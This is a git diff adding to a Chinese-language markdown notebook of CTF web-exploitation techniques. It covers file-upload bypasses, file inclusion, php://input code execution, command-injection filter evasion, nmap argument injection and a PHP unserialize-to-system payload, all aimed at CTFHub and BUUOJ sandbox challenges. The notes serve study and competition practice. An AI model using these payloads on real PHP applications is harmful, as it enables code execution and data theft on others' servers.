@@ -21,7 +21,7 @@ tags:
 
 # 使用到的工具或网址
 [DNS重绑定](https://lock.cmpxchg8b.com/rebinder.html)
-
+[CEYE](http://ceye.io) 回显
 # [SQL]
 ## 整数型注入
 > union内部的每个select语句必须拥有相同数量的列。
@@ -163,7 +163,7 @@ gopher%3A%2F%2F127.0.0.1%3A6379%2F_config%2520set%2520dir%2520%2Fvar%2Fwww%2Fhtm
 * number: 127.0.0.1, localhost, 0, 0.0.0.0...
 * 302跳转绕过
 * DNS重绑定绕过
-## []
+## [fastCGI]
 ```
 127.0.0.1:9000
 ```
@@ -172,3 +172,77 @@ gopher
 ```
 
 # [SSRF Deeper]
+一些中间件的默认配置项就设定了一些可解析的格式，如.phtml、.phps、.pht、.php2、.php3、.php4、.php5等
+## [文件上传]
+文件绕过，.htaccess把目录和子目录下所有文件都当成php处理：
+```
+SetHandler application/x-httpd-php
+```
+00截断，
+```
+POST /?road=/var/www/html/upload/empty.php%00.gif HTTP/1.1
+```
+## [文件包含]
+```
+GET /?file=shell.txt&ctfhub=system("ls") HTTP/1.1
+```
+`ls`没有结果显示，flag应该没在`/var/www/html`路径下。使用AntSword连challenge-6fe846579e2d1d51.sandbox.ctfhub.com:10800/?file=shell.txt能连接成功，还可以这样连。。。
+## [php://input]
+get改post加`Content-Type: application/x-www-form-urlencoded`
+```sh
+POST /?file=php://input HTTP/1.1
+Host: challenge-fe24f50a3307aa2a.sandbox.ctfhub.com:10800
+Accept-Language: en-US,en;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 19
+
+<?php phpinfo(); ?>
+```
+post内容修改成`<?php system('ls'); ?>`等找到flag并显示`<?php system('cat /flag_9022'); ?>`
+## [php://filter]
+```
+php://filter/read=convert.Base64-encode/resource=/flag
+```
+## [命令注入]
+`cat`的替代`tail`,`head`等；空格的替代`${IFS}`,目录分隔符`/`的替代`${HOME:0:1}`等。
+
+直接页面中输入`%0a`会被二次编码成`%250a`变成`/?ip=0%250als`没有输出。。。还是需要借助BurpSuite工具修改
+```
+/?ip=0%0atail${IFS}-n${IFS}100${IFS}fl*${HOME:0:1}fl*23570606726090.php
+```
+## [命令注入](https://buuoj.cn/challenges#[%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E6%9C%B1%E9%9B%80%E7%BB%84]Nmap)
+escapeshellarg()：将一个字符串安全地转义，以便将其作为单个参数传递给 shell 命令。
+
+escapeshellcmd()：转义一条命令中所有可能危险的元字符。
+
+`nmap` -iL 读取文件中的ip，-o 输出结果到文件
+```
+0' -iL /flag -o filename
+```
+
+访问filename'
+## [serialize](https://buuoj.cn/challenges#[%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E6%9C%B1%E9%9B%80%E7%BB%84]phpweb)
+```sh
+<?php
+class Test{
+        var $p;
+        var $func;
+}
+$a = new Test();
+$a->func = "system";
+$a->p = "find / -name \"*flag*\" 2>/dev/null";
+echo serialize($a)
+?>
+```
+
+```
+func=unserialize&p=O:4:"Test":2:{s:1:"p";s:33:"find / -name "*flag*" 2>/dev/null";s:4:"func";s:6:"system";}
+
+func=file_get_contents&p=/tmp/flagoefiu4r93
+```
+## []()
